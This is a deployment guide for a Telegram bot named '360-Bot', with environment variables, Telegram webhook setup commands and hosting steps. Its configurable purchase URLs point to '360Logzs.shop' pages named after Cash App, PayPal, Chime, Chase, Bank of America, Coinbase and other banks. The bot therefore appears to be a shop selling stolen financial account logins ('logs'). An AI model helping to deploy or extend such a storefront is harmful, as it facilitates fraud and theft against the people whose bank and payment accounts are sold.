# 🚀 360-Bot Deployment Guide

## 📋 Pre-Deployment Checklist

### ✅ **Required Environment Variables**
Make sure these are set in your deployment platform:

```bash
BOT_TOKEN=your_telegram_bot_token_here
NODE_ENV=production
PORT=3000
```

### ✅ **Optional Environment Variables** (for custom URLs)
```bash
CASHAPP_URL=https://360Logzs.shop/cashapp.html
PAYPAL_URL=https://360Logzs.shop/paypal.html
CHIME_URL=https://360Logzs.shop/chime.html
WELLS_URL=https://360Logzs.shop/wells.html
HUNTINGTON_URL=https://360Logzs.shop/huntington.html
CHASE_URL=https://360Logzs.shop/chase.html
BOA_URL=https://360Logzs.shop/boa.html
COINBASE_URL=https://360Logzs.shop/coinbase.html
WOODFOREST_URL=https://360Logzs.shop/woodforest.html
```

## 🌐 **Webhook Configuration**

### **1. Set Webhook URL**
After deployment, set your webhook URL with Telegram:

```bash
curl -X POST "https://api.telegram.org/bot<YOUR_BOT_TOKEN>/setWebhook" \
  -H "Content-Type: application/json" \
  -d '{
    "url": "https://your-domain.com/webhook/telegram"
  }'
```

### **2. Verify Webhook**
Check if webhook is set correctly:

```bash
curl "https://api.telegram.org/bot<YOUR_BOT_TOKEN>/getWebhookInfo"
```

### **3. Health Check**
Test your deployment:

```bash
curl "https://your-domain.com/webhook/health"
```

## 🚀 **Deployment Platforms**

### **Render (Recommended)**
1. Connect your GitHub repository
2. Set environment variables in Render dashboard
3. Deploy automatically
4. Set webhook URL after deployment

### **Railway**
1. Connect GitHub repository
2. Add environment variables
3. Deploy with one click
4. Set webhook URL

### **Heroku**
1. Create Heroku app
2. Set environment variables: `heroku config:set BOT_TOKEN=your_token`
3. Deploy: `git push heroku main`
4. Set webhook URL

## 🔧 **Post-Deployment Steps**

### **1. Set Webhook**
Replace `your-domain.com` with your actual domain:

```bash
curl -X POST "https://api.telegram.org/bot<YOUR_BOT_TOKEN>/setWebhook" \
  -H "Content-Type: application/json" \
  -d '{"url": "https://your-domain.com/webhook/telegram"}'
```

### **2. Test Bot**
- Send `/start` to your bot
- Test all commands
- Verify purchase buttons work
- Check navigation

### **3. Monitor**
- Check health endpoint: `/webhook/health`
- Monitor logs for errors
- Test webhook with Telegram

## 🛠️ **Troubleshooting**

### **Common Issues:**

1. **Webhook not receiving updates**
   - Check if webhook URL is correct
   - Verify SSL certificate
   - Check bot token

2. **Bot not responding**
   - Check environment variables
   - Verify webhook is set
   - Check server logs

3. **Purchase buttons not working**
   - Verify WebApp URLs are correct
   - Check if website is accessible
   - Test URLs manually

## 📊 **Monitoring Endpoints**

- **Health Check**: `GET /webhook/health`
- **Webhook**: `POST /webhook/telegram`
- **Root**: `GET /` (returns "Hello World!")

## 🔒 **Security Notes**

- ✅ Bot token is in environment variables
- ✅ No sensitive data in code
- ✅ Webhook endpoints are protected
- ✅ Error handling prevents crashes

## 🎯 **Ready for Production!**

Your bot is now ready for deployment with:
- ✅ Webhook support
- ✅ Error handling
- ✅ Health monitoring
- ✅ All commands working
- ✅ Purchase integration
- ✅ Navigation system

**Deploy and enjoy your Telegram bot! 🚀**
